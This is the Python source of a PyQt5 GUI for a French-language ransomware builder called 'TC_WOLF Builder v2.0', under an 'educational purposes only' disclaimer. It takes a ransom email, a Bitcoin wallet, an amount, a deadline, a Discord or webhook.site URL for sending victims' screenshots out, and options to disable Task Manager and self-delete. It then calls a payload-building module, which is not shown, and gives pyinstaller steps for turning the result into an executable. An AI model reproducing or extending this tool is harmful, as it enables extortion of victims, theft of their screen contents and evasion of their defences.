# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================

import sys
import os
from pathlib import Path
from PyQt5.QtCore import Qt, QDateTime
from PyQt5.QtGui import QFont, QTextCursor
from PyQt5.QtWidgets import *

from builder_core import build_ransomware_payload

class CMDWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("TC_WOLF // Builder v2.0 (FIX)")
        self.setGeometry(100, 100, 950, 800)

        self.setStyleSheet("""
            QMainWindow { background-color: #0a0a0a; }
            QTextEdit, QLineEdit {
                background-color: #0a0a0a; color: #00ff00;
                font-family: 'Consolas'; font-size: 12pt;
                border: 2px solid #00aa00; padding: 8px;
            }
            QLabel { color: #00ffff; font-family: 'Consolas'; font-size: 11pt; font-weight: bold; }
            QPushButton {
                background-color: #002200; color: #00ff00;
                font-family: 'Consolas'; font-size: 12pt; font-weight: bold;
                border: 3px outset #00aa00; padding: 10px;
                min-width: 120px;
            }
            QPushButton:hover { background-color: #004400; border: 3px outset #00ff00; }
            QPushButton:pressed { background-color: #001100; border: 3px inset #00aa00; }
            QCheckBox { color: #ff8800; font-family: 'Consolas'; font-size: 11pt; }
            QSpinBox { background-color: #0a0a0a; color: #00ff00; border: 2px solid #00aa00; padding: 5px; }
        """)

        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)

        # --- HEADER ---
        header = QLabel("""
╔══════════════════════════════════════════════════════════════╗
               T C _ W O L F   B U I L D E R  v 2 . 0
╚══════════════════════════════════════════════════════════════╝
        """)
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("color: #ff0000; font-size: 16pt; font-weight: bold;")
        layout.addWidget(header)

        # --- CONFIGURATION ---
        config_label = QLabel("[+] CONFIGURATION DU RANSOMWARE")
        config_label.setStyleSheet("color: #ffff00; font-size: 13pt;")
        layout.addWidget(config_label)

        # Champ Email
        email_layout = QHBoxLayout()
        email_layout.addWidget(QLabel("Email de contact:"))
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("ex: contact@protonmail.com")
        self.email_input.setText("contact@protonmail.com")
        email_layout.addWidget(self.email_input, 1)
        layout.addLayout(email_layout)

        # Champ Portefeuille BTC
        wallet_layout = QHBoxLayout()
        wallet_layout.addWidget(QLabel("Portefeuille BTC:"))
        self.wallet_input = QLineEdit()
        self.wallet_input.setPlaceholderText("1ABC...")
        self.wallet_input.setText("1TC-W01fH4ck3rsPwnEverything999999999")
        wallet_layout.addWidget(self.wallet_input, 1)
        layout.addLayout(wallet_layout)

        # Champ Montant
        amount_layout = QHBoxLayout()
        amount_layout.addWidget(QLabel("Montant ($):"))
        self.amount_spinbox = QSpinBox()
        self.amount_spinbox.setRange(100, 50000)
        self.amount_spinbox.setValue(1500)
        self.amount_spinbox.setSuffix(" $")
        amount_layout.addWidget(self.amount_spinbox)
        amount_layout.addStretch()
        layout.addLayout(amount_layout)

        # Champ Délai
        timer_layout = QHBoxLayout()
        timer_layout.addWidget(QLabel("Délai (heures):"))
        self.timer_spinbox = QSpinBox()
        self.timer_spinbox.setRange(1, 168)
        self.timer_spinbox.setValue(48)
        self.timer_spinbox.setSuffix(" h")
        timer_layout.addWidget(self.timer_spinbox)
        timer_layout.addStretch()
        layout.addLayout(timer_layout)

        # Champ Webhook (NOUVEAU et IMPORTANT)
        webhook_layout = QHBoxLayout()
        webhook_layout.addWidget(QLabel("Webhook URL (OBLIGATOIRE):"))
        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("https://discord.com/api/webhooks/...  ou  https://webhook.site/...")
        self.webhook_input.setText("")  # Laissez vide, doit être rempli
        webhook_layout.addWidget(self.webhook_input, 1)
        layout.addLayout(webhook_layout)

        # Options
        self.option_self_delete = QCheckBox("Auto-destruction après le délai")
        self.option_self_delete.setChecked(True)
        layout.addWidget(self.option_self_delete)

        self.option_disable_taskmgr = QCheckBox("Désactiver le Gestionnaire des tâches")
        self.option_disable_taskmgr.setChecked(True)
        layout.addWidget(self.option_disable_taskmgr)

        # --- CONSOLE ---
        console_label = QLabel("[+] CONSOLE DE CONSTRUCTION")
        console_label.setStyleSheet("color: #ffff00;")
        layout.addWidget(console_label)

        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setMinimumHeight(250)
        layout.addWidget(self.console_output)
        self._log_to_console("✅ Builder prêt. Remplis le WEBHOOK URL ci-dessus.", "#00ff00")

        # --- BOUTONS ---
        button_layout = QHBoxLayout()
        self.build_button = QPushButton("🚀 CONSTRUIRE LE RANSOMWARE")
        self.build_button.clicked.connect(self.execute_build)
        button_layout.addWidget(self.build_button)

        self.test_button = QPushButton("🔧 TESTER LE WEBHOOK")
        self.test_button.clicked.connect(self.test_webhook)
        button_layout.addWidget(self.test_button)

        self.exit_button = QPushButton("❌ QUITTER")
        self.exit_button.clicked.connect(self.close)
        button_layout.addWidget(self.exit_button)
        layout.addLayout(button_layout)

        # --- STATUT ---
        self.status_label = QLabel("Statut: En attente... | Fichier: Aucun")
        self.status_label.setStyleSheet("color: #888888; font-size: 10pt;")
        layout.addWidget(self.status_label)

    def _log_to_console(self, message, color="#00ff00"):
        timestamp = QDateTime.currentDateTime().toString("hh:mm:ss")
        html_msg = f"[<span style='color:#00aaff'>{timestamp}</span>] <span style='color:{color}'>{message}</span><br>"
        self.console_output.moveCursor(QTextCursor.End)
        self.console_output.insertHtml(html_msg)
        QApplication.processEvents()

    def test_webhook(self):
        """Test simple du webhook avec requests."""
        webhook_url = self.webhook_input.text().strip()
        if not webhook_url:
            self._log_to_console("❌ ERREUR : Aucun webhook entré.", "#ff0000")
            return

        try:
            import requests
            test_payload = {"content": "🔧 **Test du builder TC_WOLF** - Si tu vois ce message, le webhook fonctionne."}
            response = requests.post(webhook_url, json=test_payload, timeout=10)
            if response.status_code in [200, 204]:
                self._log_to_console(f"✅ Webhook test réussi ! Réponse {response.status_code}", "#00ff00")
            else:
                self._log_to_console(f"⚠️ Webhook échoué. Code: {response.status_code}", "#ff8800")
        except Exception as e:
            self._log_to_console(f"❌ Erreur de connexion: {str(e)}", "#ff0000")

    def execute_build(self):
        self._log_to_console("--- DÉBUT DE LA CONSTRUCTION ---", "#ffaa00")

        config = {
            'email': self.email_input.text().strip(),
            'wallet': self.wallet_input.text().strip(),
            'amount': self.amount_spinbox.value(),
            'timer_hours': self.timer_spinbox.value(),
            'webhook': self.webhook_input.text().strip(),  # CRITIQUE
            'self_delete': self.option_self_delete.isChecked(),
            'disable_taskmgr': self.option_disable_taskmgr.isChecked(),
        }

        # VÉRIFICATIONS
        if not config['email'] or '@' not in config['email']:
            self._log_to_console("❌ Email invalide.", "#ff0000")
            return
        if not config['wallet']:
            self._log_to_console("❌ Portefeuille BTC vide.", "#ff0000")
            return
        if not config['webhook']:
            self._log_to_console("❌ WEBHOOK URL EST VIDE ! La capture d'écran ne marchera PAS.", "#ff0000")
            reply = QMessageBox.question(self, 'Confirmation', 'Continuer sans webhook ? La capture sera désactivée.', QMessageBox.Yes | QMessageBox.No)
            if reply == QMessageBox.No:
                return

        self._log_to_console(f"✅ Config validée. Webhook: {config['webhook'][:60]}...", "#00aaff")

        # CONSTRUCTION
        try:
            output_path = build_ransomware_payload(config)
            self._log_to_console(f"✅ Ransomware construit avec SUCCÈS !", "#00ff00")
            self._log_to_console(f"📁 Fichier : {output_path}", "#00aaff")
            self.status_label.setText(f"Statut: SUCCÈS | Fichier: {os.path.basename(output_path)}")

            # Message final avec instructions
            msg_box = QMessageBox(self)
            msg_box.setWindowTitle("✅ Construction Terminée")
            msg_box.setText(f"""
Le ransomware a été créé avec la capture d'écran activée.

📂 Emplacement :
{output_path}

⚠️ POUR QUE LA CAPTURE MARCHE :
1. Installe les modules sur ton PC : 
   → Ouvre un terminal (CMD) et tape :
      pip install pyautogui requests
2. Si tu veux un .exe, utilise cette commande :
   pyinstaller --onefile --windowed --hidden-import pyautogui --hidden-import requests "{output_path}"
""")
            msg_box.exec_()

        except Exception as e:
            self._log_to_console(f"❌ CATASTROPHE : {str(e)}", "#ff0000")
            self.status_label.setText("Statut: ÉCHEC")
            QMessageBox.critical(self, "Erreur", f"Crash total :\n{str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Consolas", 10))
    window = CMDWindow()
    window.show()
    sys.exit(app.exec_())